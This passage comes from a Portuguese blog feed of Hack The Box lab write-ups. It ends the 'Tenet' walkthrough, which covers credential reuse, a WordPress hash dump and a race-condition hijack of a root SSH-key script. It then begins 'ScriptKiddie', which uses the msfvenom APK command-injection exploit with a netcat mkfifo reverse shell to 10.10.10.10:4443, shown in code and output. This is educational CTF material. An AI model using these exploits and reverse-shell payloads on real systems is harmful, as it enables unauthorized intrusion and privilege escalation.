&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Opera2112'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cd&quot;&gt;/** MySQL hostname */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como o reuso de credenciais é algo bastante comum, ao executar o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su neil&lt;/code&gt;, fornecendo a senha presente no arquivo de configuração do wordpress, obtive o acesso com a conta do usuário e a flag de user.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neil@tenet:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;neil&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;neil&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;neil&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
neil@tenet:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/user.txt
&amp;lt;redacted&amp;gt;
neil@tenet:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;p&gt;No caminho para a flag de root, decidi fazer o dump das credenciais presentes no wordpress, onde os seguintes hashes foram encontrados.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select user_login,user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. |
| neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. |
+-------------+------------------------------------+
2 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Adicionalmente, buscando por possiveis privilégios de sudo do usuário neil (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;), notado que o usuário possuía privilégios para executar o script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enableSSH.sh&lt;/code&gt;, listado abaixo.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
    
User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Analisando o conteúdo do script vemos que o mesmo foi criado para forçar a configuração de uma chave pública como autorizada para o usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; para acesso SSH, embora não tenhamos acesso à mesma.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

checkAdded&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;sshName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/bin/echo &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; | /usr/bin/cut &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 3&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/bin/grep &lt;span class=&quot;nv&quot;&gt;$sshName&lt;/span&gt; /root/.ssh/authorized_keys&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        /bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Successfully added &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sshName&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; to authorized_keys file!&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        /bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Error in adding &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sshName&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; to authorized_keys file!&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

checkFile&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        /bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Error in creating key file!&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt; /bin/rm &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

addKey&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;tmpName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; /tmp/ssh-XXXXXXXX&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;110&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    /bin/echo &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt;
    checkFile &lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt;
    /bin/cat &lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;/root/.ssh/authorized_keys
    /bin/rm &lt;span class=&quot;nv&quot;&gt;$tmpName&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&quot;&lt;/span&gt;
addKey
checkAdded
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Analisando o script acima, notei uma possibilidade de hijack por conta de um race condition existente, onde na função “addKey” é criado um arquivo temporario, incluindo o seu conteúdo da chave pública e, após isso, seu conteúdo é adicionado no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/.ssh/authorized_keys&lt;/code&gt;, possivelmente nos permitindo modificar este arquivo em tempo de execução para incluir outra chave SSH no lugar desta.&lt;/p&gt;

&lt;p&gt;O desafio nesta parte é prever o nome do arquivo ssh em &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;, mas que ao buscar por uma forma de adicionar um valor em múltiplos arquivos, o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tee&lt;/code&gt; foi a melhor opção. O script abaixo foi criado e colocado em execução para infinitamente incluir o conteúdo de uma chave criada por mim em quaisquer arquivos que possuíssem o nome &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-*&lt;/code&gt; em &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa AAAA..............BBBB= root@ubuntu&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee&lt;/span&gt; /tmp/ssh-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 2&amp;gt; /dev/null&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Com o script acima em execução, executado o comando para habilitar o SSH para o usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; e logo na sequência, o comando ssh para se conectar com a chave privada em nossa posse, onde obtivemos sucesso para conectar nesta máquina utilizando o SSH e obter a flag de root :smiley:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neil@tenet:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;  /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tenet root@tenet.htb
Welcome to Ubuntu 18.04.5 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.15.0-129-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
root@tenet:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@tenet:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
b05e57e997cda49b47757cd3f0f9ac43
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que tenham gostado!&lt;/p&gt;

&lt;p&gt;Vejo vocês no próximo post! :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-medium" /><category term="htb-linux" /><summary type="html">Olá pessoal! A máquina desta semana será Tenet, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW.</summary></entry><entry><title type="html">Hackthebox write-up: ScriptKiddie</title><link href="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/" rel="alternate" type="text/html" title="Hackthebox write-up: ScriptKiddie" /><published>2021-06-05T13:00:00-03:00</published><updated>2021-06-05T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/06/htb-scriptkiddie</id><content type="html" xml:base="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/">&lt;p&gt;Olá pessoal!&lt;/p&gt;

&lt;p&gt;A máquina desta semana será &lt;strong&gt;ScriptKiddie&lt;/strong&gt;, outra máquina Linux classificada como fácil do &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, criada por &lt;a href=&quot;https://app.hackthebox.eu/users/4935&quot;&gt;0xdf&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/W5wv9JE.png&quot; alt=&quot;HTB ScriptKiddie&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeração&quot;&gt;Enumeração&lt;/h2&gt;

&lt;p&gt;Como de costume, iniciado enumeração com um scan rápido do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para verificar os serviços publicados nesta máquina.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.226                                                                   

Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-24 14:05 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.226
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.077s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
5000/tcp open  http    Werkzeug httpd 0.16.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Python 3.8.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d&lt;span class=&quot;s1&quot;&gt;'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;5000tcp---serviço-http&quot;&gt;5000/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Ao acessar a página notado algumas ferramentas a serem utilizadas por algum script kiddie como executar um scan utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, criar um payload no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; e buscar por exploits utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Tentei diversas formas de injeção de código neste formulário, inclusive tentando algo automatizado como por exemplo a ferramenta &lt;a href=&quot;https://github.com/commixproject/commix&quot;&gt;commixproject/commix&lt;/a&gt; que encontrei no Github, porém sem sucesso desta vez.&lt;/p&gt;

&lt;p&gt;Buscando por vulnerabilidades nas ferramentas utilizadas pela página (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;), acabei encontrando uma relacionada ao &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;, conforme abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit msfvenom
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                        |  Path
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Metasploit Framework 6.0.11 - msfvenom APK template &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;injection | multiple/local/49491.py
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;aceso-inicial-e-user-flag&quot;&gt;Aceso inicial e User flag&lt;/h2&gt;

&lt;p&gt;Alterado arquivo python com o payload desejado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &amp;gt;/tmp/f&lt;/code&gt;, encontrei alguns erros durante a execução do binário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keytool&lt;/code&gt;, uma vez que este tenta assinar um arquivo APK com o payload no Common Name mas, uma vez que existia um caracter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; no conteúdo codificado em base64 na primeira iteração, precisei modificá-lo para codificá-lo novamente, gerando um payload desta vez com sucesso a ser enviado na ferramenta e utilizado na exploração da vulnerabilidade no portal:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Change me
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &amp;gt;/tmp/f'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# b64encode to avoid badchars (keytool is picky)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'+'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'| base64 -d | base64 -d'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'| base64 -d'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;dname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CN='|echo -n &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; | sh #&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Abaixo podemos ver o output da criação do payload gerado, no caso o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.apk&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49491.py                                                                                                               
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Manufacturing evil apkfile
Payload: &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
